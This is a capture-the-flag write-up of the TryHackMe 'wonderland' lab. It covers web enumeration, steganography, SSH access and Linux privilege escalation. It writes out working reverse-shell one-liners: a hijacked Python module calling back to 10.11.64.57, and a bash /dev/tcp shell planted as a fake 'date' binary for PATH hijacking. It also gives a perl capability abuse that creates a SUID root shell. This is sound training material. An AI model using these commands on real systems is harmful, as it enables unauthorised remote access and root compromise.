---
title: wonderland
categories: [CTF, THM]
tags: [http, ssh, steganography, linux_privesc, reverse_engineering]
date: 2024-03-06 08:00 +0700
---

## nmap
- after nmap scan, port 22 and 80 are open

## feroxbuster
- `feroxbuster -u http://$IPTA:80 -t 30 -w /usr/share/dirb/wordlists/common.txt -x txt,html,sql,csv,png,jpg,jpeg,php,js,md,sh,py,css,cgi,xml,aspx,zip,tar,tar.gz,bak dir -o "ferox_$IPTA"_common_all.txt` 
![](/assets/img/img_thm_ctf_wonderland_7.png)

## manual web enumeration / steganography
![](/assets/img/img_thm_ctf_wonderland_6.png)
- `wget http://10.10.104.129/img/white_rabbit_1.jpg; ./stegoBF.sh white_rabbit_1.jpg`
	- or `stegseek white_rabbit_1.jpg -q -c`
- `cat *.out*`
- we can extract several strings in them, all saying "follow the r a b b i t"
![](/assets/img/img_thm_ctf_wonderland_5.png)
- feroxbuster got /r, with the message keep going on the page
![](/assets/img/img_thm_ctf_wonderland_8.png)
- given the message in the image and on the web page, we need to continue the letters until r/a/b/b/i/t 
- and indeed in the source code of the page, we get the SSH credentials of alice 
![](/assets/img/img_thm_ctf_wonderland_9.png)
- `ssh alice@$IPTA`

# linux privesc
## python script with import -> rabbit
- `sudo -l; head /home/alice/walrus_and_the_carpenter.py` we can execute a python script as rabbit, and this script import the 'random' module. We can create our own module file, which will be loaded in priority
![](/assets/img/img_thm_ctf_wonderland_10.png)
- `echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.64.57",56766));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > random.py` let's write a reverse shell code in the random.py file
- US2: `nc -lvnp 56766`
- `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
![](/assets/img/img_thm_ctf_wonderland_11.png)
- we have a rabbit shell, let's stabilize it with python

## reverse engineering -> hatter
- `file teaParty` we have a binary file, let's download it to analyse it
- TA:`python3 -m http.server`
- US:`wget $IPTA:8000/teaParty`
- `ltrace ./teaParty` the script will allow us to get a hatter shell
![](/assets/img/img_thm_ctf_wonderland_2.png)
- first I thought of a buffer overflow, but reverse engineering it with ghidra, we can see that the Segmentation fault message is hardcoded. What we see here is that date binary is called with a relative path! And since it's a SUID script, we can modify our path to execute our own date binary, as hatter user
![](/assets/img/img_thm_ctf_wonderland_3.png)
- `echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.11.64.57/56767 0>&1"' > date; chmod +x date` this one!
- US3:`nc -lvnp 56767`
- `PATH=.:$PATH ./teaParty`
![](/assets/img/img_thm_ctf_wonderland_12.png)
- notice how the script is stopped when the date binary start our reverse shell

## perl with extra capabilities -> root
- stabilize the shell with bash this time
- `cat /home/hatter/password.txt`
- `su hatter` we needed this password, otherwise we're not fully logged as hatter since we used a SUID script
- `getcap -r / 2>/dev/null` search for files that have capabilities (or use linpeas)
- `perl -v` https://gtfobins.github.io/gtfobins/perl/#capabilities we can execute perl, it has extra capabilities set, we can use it to get a root shell
- `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash";'` 
- `/tmp/rootbash -p`
- `find / \( -name "user.txt" -o -name "root.txt" \) 2>/dev/null | while read -r flagfile; do echo -e "\n$flagfile"; cat $flagfile; done`
![](/assets/img/img_thm_ctf_wonderland_13.png)